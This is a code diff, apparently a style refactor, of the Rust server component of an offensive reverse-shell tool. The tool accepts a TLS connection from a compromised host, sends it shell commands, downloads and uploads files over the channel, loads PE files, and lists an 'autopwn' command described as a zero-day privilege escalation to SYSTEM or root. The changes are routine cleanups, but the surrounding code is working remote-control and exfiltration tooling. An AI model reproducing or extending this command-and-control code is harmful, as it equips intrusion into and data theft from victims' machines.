@@ -5,7 +5,6 @@ use std::process::exit;
 use std::sync::Arc;
 use std::thread;
 
-use ctrlc;
 use native_tls::{Identity, TlsAcceptor};
 use regex::Regex;
 use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};
@@ -56,7 +55,7 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
     println!("{}", banner());
     log::info!("[+] Binded to {}:{}", ip_addr, port);
 
-    for tcp_stream in listener.incoming() {
+    if let Some(tcp_stream) = listener.incoming().next() {
         match tcp_stream {
             Ok(tcp_stream) => {
                 let acceptor = acceptor.clone();
@@ -126,14 +125,14 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                         if cmd.trim_end_matches('\0').trim_end().ne("") {
                             // Check for download/upload commands
                             if cmd.as_str().starts_with("download") {
-                                let path: Vec<&str> = cmd.split(" ").collect();
+                                let path: Vec<&str> = cmd.split(' ').collect();
                                 if path.len() != 3 {
                                     log::warn!("Invalid argument number. Usage is : download C:\\file\\to\\download C:\\local\\path\0");
                                 } else {
                                     match File::create(path[2].trim_end_matches('\0').trim_end()) {
                                         Ok(mut file) => {
                                             let mut buff = [0; 4096];
-                                            match stream.write(&cmd.as_bytes()) {
+                                            match stream.write(cmd.as_bytes()) {
                                                 Ok(_) => (),
                                                 Err(r) => {
                                                     log::error!(
@@ -152,8 +151,8 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                                         // Drop all the ending null bytes added by the buffer
                                                         let file_len_string =
                                                             String::from_utf8_lossy(&buff)
-                                                                .splitn(2, ':')
-                                                                .nth(1)
+                                                                .split_once(':')
+                                                                .map(|x| x.1)
                                                                 .unwrap_or("0")
                                                                 .trim_end_matches('\0')
                                                                 .to_owned();
@@ -171,7 +170,9 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                                         match file.write(&buff) {
                                                             Ok(_) => {
                                                                 buff = [0; 4096];
-                                                                stream.read(&mut buff).unwrap();
+                                                                stream
+                                                                    .read_exact(&mut buff)
+                                                                    .unwrap();
                                                             }
                                                             Err(r) => {
                                                                 log::error!(
@@ -199,17 +200,17 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 }
                                 continue;
                             } else if cmd.as_str().starts_with("upload") {
-                                let path: Vec<&str> = cmd.split(" ").collect();
+                                let path: Vec<&str> = cmd.split(' ').collect();
                                 if path.len() != 3 {
                                     log::warn!("Invalid argument number. Usage is : upload C:\\local\\file\\to\\upload C:\\remote\\path\\to\\write\0");
                                 } else {
                                     match File::open(path[1]) {
                                         Ok(mut file) => {
                                             let mut buff = [0; 4096];
-                                            match stream.write(&cmd.as_bytes()) {
+                                            match stream.write(cmd.as_bytes()) {
                                                 Ok(_) => {
                                                     stream
-                                                        .read(&mut buff)
+                                                        .read_exact(&mut buff)
                                                         .expect("Cannot read file creation result");
                                                     if String::from_utf8_lossy(&buff)
                                                         .trim_end_matches('\0')
@@ -356,7 +357,7 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                         Ok(_) => {
                                             while !path_regex.is_match(
                                                 String::from_utf8_lossy(&buff)
-                                                    .trim_end_matches("\0")
+                                                    .trim_end_matches('\0')
                                                     .to_string()
                                                     .as_str(),
                                             ) {
@@ -389,7 +390,7 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                     }
                                     io::stdout().flush().unwrap();
                                     io::stdin().read_line(&mut cmd).expect("[-] Input issue");
-                                    match stream.write(&cmd.as_bytes()) {
+                                    match stream.write(cmd.as_bytes()) {
                                         Ok(_) => (),
                                         Err(r) => {
                                             log::error!(
@@ -411,7 +412,7 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                             }
 
                             stream
-                                .write(&cmd.as_bytes())
+                                .write_all(cmd.as_bytes())
                                 .expect("Error sending command");
                             let mut buff = [0; 4096];
                             // Read output from client
@@ -470,14 +471,13 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                 exit(5);
             }
         }
-        break;
     }
 
     Ok(())
 }
 
 fn help() -> String {
-    return "[+] Custom integrated commands :
+    "[+] Custom integrated commands :
 
     [+] Loading commands
     > load C:\\path\\to\\PE_to_load
@@ -508,11 +508,11 @@ fn help() -> String {
     [+] Special commands
     > autopwn
         escalate to the SYSTEM or root account from any local account by exploiting a zero day
-    ".to_string();
+    ".to_string()
 }
 
 fn banner() -> String {
-    return r#"
+    r#"
      ____  _____      _____ __         ____
     / __ \/ ___/     / ___// /_  ___  / / /
    / /_/ /\__ \______\__ \/ __ \/ _ \/ / / 
@@ -522,5 +522,5 @@ fn banner() -> String {
                @BlWasp_                          
  
     "#
-    .to_string();
+    .to_string()
 }
